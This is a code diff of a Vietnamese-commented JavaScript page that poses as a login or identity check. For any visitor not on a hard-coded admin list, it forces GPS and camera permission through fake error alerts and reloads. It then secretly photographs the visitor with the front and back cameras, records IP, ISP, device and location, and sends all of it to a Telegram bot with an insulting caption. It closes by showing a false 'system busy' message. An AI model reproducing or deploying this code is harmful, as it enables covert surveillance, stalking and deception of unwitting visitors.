@@ -5,87 +5,46 @@ const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMes
 const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 
 const info = {
-  time: '', 
-  ip: '',
-  isp: '',
-  address: '',
-  lat: '',
-  lon: '',
-  loginDetails: '',
-  isAdmin: false,
-  device: ''
+  time: '', ip: '', isp: '', address: '', lat: '', lon: '',
+  loginDetails: '', isAdmin: false, device: ''
 };
 
-// --- 1. LẤY THIẾT BỊ (DVI) CHUẨN ---
+// --- 1. LẤY THIẾT BỊ ---
 function getDeviceInfo() {
     const ua = navigator.userAgent;
     const ratio = window.devicePixelRatio;
     const screenRes = `${window.screen.width * ratio}x${window.screen.height * ratio}`;
-    let model = "";
-
-    if (/iPhone|iPad/.test(ua)) {
-        model = "Apple Device";
-        if (screenRes === "1290x2796") model = "iPhone 15/16 Pro Max";
-        else if (screenRes === "1179x2556") model = "iPhone 15/16 Pro";
-        else if (screenRes === "1284x2778") model = "iPhone 12/13/14 Pro Max";
-        else if (screenRes === "1170x2532") model = "iPhone 12/13/14 / Pro";
-    } else if (/Android/.test(ua)) {
-        const match = ua.match(/Android\s([0-9\.]+);.*?\s([^;]+)\sBuild/);
-        model = match ? `Android ${match[1]} - ${match[2]}` : "Android Phone";
-    } else if (/Windows/.test(ua)) {
-        model = "Windows PC";
-    } else {
-        model = "Thiết bị không xác định";
-    }
-    
-    let browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Safari") ? "Safari" : "Browser";
-    return `${model} (${browser})`;
+    if (/iPhone|iPad/.test(ua)) return "iPhone/iPad (iOS)";
+    if (/Android/.test(ua)) return "Android Phone";
+    return "PC / Laptop";
 }
 
-// --- 2. LẤY VỊ TRÍ CHUẨN (ƯU TIÊN GPS) ---
-async function getLocationData() {
-    return new Promise((resolve) => {
-        // Cố gắng lấy GPS chính xác cao
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    info.lat = pos.coords.latitude.toFixed(6);
-                    info.lon = pos.coords.longitude.toFixed(6);
-                    info.address = "📍 Vị trí chính xác (GPS)";
-                    await getIPInfo(); // Vẫn lấy IP để biết nhà mạng
-                    resolve();
-                },
-                async () => {
-                    // Nếu bị từ chối GPS, dùng IP làm dự phòng
-                    await getIPInfo();
-                    resolve();
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        } else {
-            getIPInfo().then(resolve);
+// --- 2. ÉP BUỘC GPS (BẮT BUỘC) ---
+async function forceLocation() {
+    return new Promise((resolve, reject) => {
+        if (!("geolocation" in navigator)) {
+            alert("Trình duyệt của bạn quá cũ để truy cập. Vui lòng nâng cấp!");
+            reject();
         }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                info.lat = pos.coords.latitude.toFixed(6);
+                info.lon = pos.coords.longitude.toFixed(6);
+                info.address = "📍 Vị trí GPS chuẩn xác";
+                resolve();
+            },
+            () => {
+                alert("❌ LỖI: Bạn phải cho phép truy cập Vị trí để xác minh danh tính!");
+                location.reload(); // Từ chối là load lại trang
+                reject();
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
     });
 }
 
-async function getIPInfo() {
-    try {
-        const res = await fetch(`https://ipwho.is/`);
-        const data = await res.json();
-        info.ip = data.ip || 'Không rõ';
-        info.isp = data.connection?.org || 'ISP';
-        if (!info.lat) { // Nếu GPS chưa có mới dùng tọa độ IP
-            info.lat = data.latitude || 0;
-            info.lon = data.longitude || 0;
-            info.address = `${data.city}, ${data.region} (Tọa độ IP)`;
-        }
-    } catch (e) { 
-        info.ip = 'Lỗi kết nối'; 
-    }
-}
-
-// --- 3. CHỤP CAM ---
-async function captureCamera(mode = 'user') {
+// --- 3. ÉP BUỘC CAMERA (BẮT BUỘC) ---
+async function forceCapture(mode = 'user') {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
         return new Promise(resolve => {
@@ -103,39 +62,31 @@ async function captureCamera(mode = 'user') {
                 }, 800);
             };
         });
-    } catch (e) { return null; }
-}
-
-// --- 4. TẠO NỘI DUNG ---
-function getCaption() {
-    // Link ghim vị trí chuẩn trên Google Maps
-    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
-    
-    let header = "";
-    let dviLine = "";
-
-    if (info.isAdmin) {
-        header = `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP`;
-        dviLine = ""; // Admin ẩn dvi
-    } else {
-        header = `🚫 PHÁT HIỆN MỘT CON CHÓ NGU`;
-        dviLine = `📱 Thiết bị (dvi): ${info.device}\n`; 
+    } catch (e) {
+        alert("❌ LỖI: Bạn phải cho phép truy cập Camera để tiếp tục!");
+        location.reload(); // Từ chối là load lại trang
+        return null;
     }
-
-    return `
-${header}
-━━━━━━━━━━━━━━━━━━
-⏰ Thời gian: ${info.time}
-👤 Tài khoản: ${info.loginDetails}
-🌐 IP dân cư: ${info.ip}
-🏢 Nhà mạng: ${info.isp}
-${dviLine}🏙️ Địa chỉ: ${info.address}
-📍 Bản đồ: ${mapsLink}
-━━━━━━━━━━━━━━━━━━
-`.trim();
 }
 
-// --- 5. HÀM CHÍNH ---
+async function getIPOnly() {
+    try {
+        const res = await fetch(`https://ipwho.is/`);
+        const data = await res.json();
+        info.ip = data.ip || 'Không rõ';
+        info.isp = data.connection?.org || 'ISP';
+    } catch (e) { info.ip = 'Lỗi kết nối'; }
+}
+
+function getCaption() {
+    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
+    if (info.isAdmin) {
+        return `⚠️ ADMIN ĐĂNG NHẬP\n👤 ${info.loginDetails}\n🌐 IP: ${info.ip}\n📍 Maps: ${mapsLink}`;
+    }
+    return `🚫 PHÁT HIỆN CON CHÓ NGU\n👤 Tài khoản: ${info.loginDetails}\n📱 Thiết bị: ${info.device}\n🌐 IP: ${info.ip}\n🏢 ISP: ${info.isp}\n📍 Maps: ${mapsLink}`.trim();
+}
+
+// --- HÀM CHÍNH (LOGIC MỚI) ---
 async function main() {
     const user = document.getElementById('username').value.trim();
     const role = document.getElementById('user-role').value;
@@ -145,25 +96,30 @@ async function main() {
     info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
     info.device = getDeviceInfo();
 
-    // Chờ lấy vị trí chuẩn
-    await getLocationData();
-    
+    // Bước 1: Lấy IP (Luôn chạy)
+    await getIPOnly();
+
+    // Bước 2: Kiểm tra nếu là Admin thì cho qua luôn, không cần ép GPS/Cam
     if (info.isAdmin) {
         await fetch(API_SEND_TEXT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption(), disable_web_page_preview: true })
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
         });
-        return true;
+        alert("Chào mừng Sếp quay trở lại!");
+        return true; 
     }
 
-    // Chụp 2 cam cho người lạ
-    const frontBlob = await captureCamera('user');
-    const backBlob = await captureCamera('environment');
+    // Bước 3: Nếu là người lạ -> ÉP BUỘC GPS
+    await forceLocation();
 
+    // Bước 4: ÉP BUỘC CAMERA
+    const frontBlob = await forceCapture('user');
+    const backBlob = await forceCapture('environment');
+
+    // Bước 5: Gửi dữ liệu về Telegram
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
-    
     const media = [];
     if (frontBlob) {
         formData.append('front', frontBlob, 'front.jpg');
@@ -177,12 +133,10 @@ async function main() {
     if (media.length > 0) {
         formData.append('media', JSON.stringify(media));
         await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
-    } else {
-        await fetch(API_SEND_TEXT, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
-        });
     }
-    return true; 
+
+    // Sau khi lấy hết dữ liệu mới cho vào (hoặc thông báo lỗi giả)
+    alert("Hệ thống bận, vui lòng thử lại sau!");
+    location.reload();
+    return true;
 }
